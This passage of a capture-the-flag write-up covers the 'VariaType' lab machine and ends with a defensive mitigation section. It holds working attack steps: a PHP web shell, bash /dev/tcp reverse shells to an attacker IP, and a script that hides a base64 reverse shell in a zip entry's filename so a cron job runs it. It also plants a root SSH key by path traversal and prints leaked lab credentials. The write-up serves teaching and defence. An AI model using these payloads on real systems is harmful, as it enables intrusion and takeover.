  -F "designspace=@malicious.designspace" \\

  -F "masters=@source-light.ttf" \\

  -F "masters=@source-regular.ttf" \\

  -H "Expect:"
```

- 🔍 *Now test if we can Write cmd commands in the URL*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 🔍 *perfect!, now lets just get the shell*

- 🔍 *start a listener*

```text
nc -lvnp 4444
```

- 🔍 *upload the rev shell payload*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.****%2F4444%200%3E%261%27"
```

```text
(note:- change ip)
```

- 🔍 *Shell!*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 35860

bash: cannot set terminal process group (3365): Inappropriate ioctl for device

bash: no job control in this shell
```

```bash
www-data@variatype:~/portal.variatype.htb/public/files$
```

- 🔍 *Got the shell*

- 🔍 *Now while enumerating i saw a pspy output, and it showed me that there is a CRON job running in the background!*

- 🔍 *Cron jobs are nothing but some scheduled task that runs for system  maintenance or logs after a specific interval of time.*

- 🔍 *In our case there is a script "/home/steve/bin/process_client_submissions.sh", which automatically runs after a period of time.*

- 🎯 **Attack path -**

- 🔍 *will create a python script, which will create a zip file containing a rev shell base64 encoded payload*

- 🔍 *will share it to target*

- 🔍 *when the CRON jobs runs, and the zip file is being extracted, it runs the payload!*

- 🔍 *Okay So lets create the python scritp*

```text
#!/usr/bin/env python3

import zipfile

import base64

import os

rev_shell = "bash -i >& /dev/tcp/10.10.14.****/4445 0>&1"

payload = base64.b64encode(rev_shell.encode()).decode()

exploit_filename = f'$(echo {payload}|base64 -d|bash).ttf'

with zipfile.ZipFile('exploit.zip', 'w') as zipf:

    zipf.writestr(exploit_filename, "This file will execute a reverse shell when extracted")

print(f"[+] Created exploit.zip with filename: {exploit_filename}")

print(f"[+] Payload: {rev_shell}")
```

- 🔍 *run it, it will create a zip file.*

- 🔍 *send it to target via-->*

```bash
curl http://YOUR_IP:8000/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

- 🔍 *Setup a listener, and wait for 1 to 2 minutes, to let the CRON job hit*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 34090

bash: cannot set terminal process group (4529): Inappropriate ioctl for device

bash: no job control in this shell
```

```bash
steve@variatype:/tmp/ffarchive-4530-1$
```

- 🔍 *got steve?*

- 🔍 *get user flag!*

## Step 3 - Privilege Escalation

- 🔍 *lets check steve's privileges*

```bash
steve@variatype:/tmp/ffarchive-3775-1$ sudo -l

sudo -l
```

```text
Matching Defaults entries for steve on variatype:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,

    use_pty

User steve may run the following commands on variatype:

    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

- 🔍 *So steve can run python3 and install_validator.py as root*

- 🔍 *i have analyzed the file-->*

```text
Vulnerability Analysis:-

	The script used setuptools.package_index.PackageIndex.download() which has a vulnerability:

	It doesn't sanitize the filename portion of the URL

	Path traversal sequences (../) in the URL path can write files outside the intended directory

	The script runs as root via sudo

	However, there were two protections:

	1.URL length check (can't have too many / characters)

	2.PackageIndex requires an #egg=name-version suffix for Python packages
```

- 🔍 *Since we have sudo access to run the install_validator.py script as root, we can use it to add our SSH key to root's authorized_keys for persistent access.*

- 🔍 *Lets first generate our SSH keys*

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""

mkdir -p /tmp/serve

cp /tmp/rootkey.pub /tmp/serve/authorized_keys
```

- 🔍 *Create a Custom HTTP server which will serve our keys!*

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):

        with open('authorized_keys', 'rb') as f:

            data = f.read()

        self.send_response(200)

        self.send_header('Content-Type', 'text/plain')

        self.send_header('Content-Length', len(data))

        self.end_headers()

        self.wfile.write(data)

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

- 🔍 *run the server*

- 🔍 *now on steve, run the validator module*

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \\

  "http://YOUR_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

```text
2026-03-20 02:11:33,769 [INFO] Attempting to install plugin from: http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys

2026-03-20 02:11:33,777 [INFO] Downloading http://10.10.14.**:8888/%2Froot%2F.ssh%2Fauthorized_keys

2026-03-20 02:11:36,463 [INFO] Plugin installed at: /root/.ssh/authorized_keys

[+] Plugin installed successfully.
```

- 🔍 *Now we can access the root from our machine with*

```bash
ssh -i /tmp/rootkey root@10.129.9.74
```

```text
The authenticity of host '10.129.9.74 (10.129.9.74)' can't be established.

ED25519 key fingerprint is SHA256:0Wqe+nNeYlUwY+F669ywmS9kPUMYXqJh5xxCxwyCapI.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.9.74' (ED25519) to the list of known hosts.

Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Fri Mar 20 02:14:34 2026 from 10.10.14.67
```

```bash
root@variatype:~# cat /root/root.txt
```

```text
3accbc651e835f15360e76cd75c6f567
```

- 🔍 *PAWNED!!!! EASyy!!*


## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and structural misconfiguration exploited in the VariaType system. Each vulnerability is mapped to its core risk, threat impact, and practical defensive remediation strategies.

### 🔴 Exposed Git Directory and Credential Exposure
> [!WARNING]
> **Vulnerability Profile:**
> The web service exposed its version control directory (`.git`) to public access. An attacker recovered the commit history and parsed historical compressed repository blobs (`b328305f0e85c2b97a7e2a94978ae20f16db75e8`), retrieving automated pipeline credentials (`gitbot` : `G1tB0t_Acc3ss_2025!`) from the version-controlled `auth.php` script.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Public Git folders expose source code, configuration details, database schemas, and hardcoded authentication secrets. Leakage of automated service credentials gives attackers potential persistent access to APIs, portals, and system integration points.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Configure Nginx and other web servers to explicitly deny access to hidden files (`.git/`, `.env`, etc.) by returning a `403 Forbidden` status. Implement automated scans (using tools like Trufflehog or GitGuardian) in CI/CD pipelines to prevent secrets from being committed.
> - **Detection:** Set up log alerts for requests attempting to access files starting with `/.git/` and monitor unauthorized access attempts on static authentication pages.

### 🔴 XML CDATA Injection & Path Traversal in fontTools (CVE-2025-66034)
> [!WARNING]
> **Vulnerability Profile:**
> The application compiled font designs using a vulnerable version of `fontTools.varLib`. The XML-based `.designspace` file configuration failed to sanitize path values inside the `<variable-font>` element's `filename` attribute, while evaluating inline CDATA block vectors inside `<labelname>` tags. This allowed writing a PHP shell to the web-accessible directory.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Path traversal inside file compilation structures lets attackers bypass upload directory isolation. Combined with XML injection, attackers can write arbitrary code contents, leading to Remote Code Execution (RCE) as the web daemon user.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade `fontTools` to version 4.60.2 or higher. Ensure all user-supplied files are compiled inside sandboxed directories, and sanitize path values to remove traversal strings (`../`).
> - **Detection:** Monitor HTTP file upload points for files containing XML schema declarations (`<?xml`), CDATA wrapper tags (`<![CDATA[`), or PHP executable symbols (`<?php`).

### 🔴 Wildcard Extraction Filename Command Injection
> [!WARNING]
> **Vulnerability Profile:**
> The background cron job executing `/home/steve/bin/process_client_submissions.sh` extracted incoming client archive files using a wildcard extraction command. This command parsed filenames literally, causing the shell to execute command segments embedded directly inside a file name (e.g. `$(echo payload | base64 -d | bash).ttf`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Command injection in background automated scripts allows a lower-privileged user to immediately hijack user contexts running scheduled jobs.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Avoid invoking external shell commands for file actions. Use internal programming APIs (e.g., Python's built-in `zipfile` module) to process archives, and strip special shell characters (such as `$`, `(`, `)`, `;`, `&`) from filenames before processing.
> - **Detection:** Track execution monitors (e.g., Audited, Sysmon) for parent shells (like `unzip`) spawning child shell processes (such as `bash` or `sh`) from non-interactive system users.

### 🔴 Path Traversal in setuptools PackageIndex (CVE-2025-47273)
> [!WARNING]
> **Vulnerability Profile:**
> The sudo configuration allowed user `steve` to execute `/opt/font-tools/install_validator.py` as root without a password. The script used a vulnerable version of `setuptools.package_index.PackageIndex` to download package resources. The library failed to validate url-encoded paths, allowing file-writes to arbitrary target paths via traversal parameters (e.g., writing the public key to `/root/.ssh/authorized_keys`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Insecure sudo permissions combined with library path traversal allows complete system takeover and local privilege escalation to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update `setuptools` to a secure version. Restrict wildcard parameters in `sudoers` definitions, and ensure internal validator scripts enforce hardcoded paths and validate input strings before passing them to the package installer.
> - **Detection:** Log and alert on all executions of `sudo` calling Python installer scripts with external URL arguments. Monitor changes to `/root/.ssh/authorized_keys`.

